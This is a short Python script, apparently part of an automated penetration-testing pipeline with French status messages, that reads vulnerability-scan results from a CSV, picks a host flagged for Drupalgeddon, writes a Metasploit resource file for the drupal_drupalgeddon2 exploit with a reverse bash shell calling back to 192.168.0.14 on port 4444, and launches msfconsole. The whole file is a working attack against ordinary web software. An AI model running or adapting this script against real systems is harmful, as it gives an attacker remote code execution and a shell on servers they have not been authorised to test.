import csv, os, subprocess

def run_drupalgeddon():
    vuln = "/workspace/csv_results/vuln_results.csv"
    rc = "/workspace/every_exploits/drupalgeddon.rc"
    target = None

    for r in csv.DictReader(open(vuln)):
        if "http" in r["service"] and "Drupalgeddon" in r["exploits"]:
            target = r["ip"]; break

    if not target:
        print("[-] Aucun Drupalgeddon détecté.")
        return

    print(f"[+] Drupalgeddon détecté sur {target}")
    with open(rc, "w") as f:
        f.write("\n".join([
            "use exploit/multi/http/drupal_drupalgeddon2",
            f"set RHOSTS {target}",
            "set TARGETURI /",
            "set PAYLOAD cmd/unix/reverse_bash",
            "set LHOST 192.168.0.14",
            "set LPORT 4444",
            "exploit"
        ]))

    subprocess.run([
        "bash", "-c",
        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle "
        "exec /opt/tools/metasploit-framework/msfconsole -r " + rc
    ])

if __name__ == "__main__":
    run_drupalgeddon()
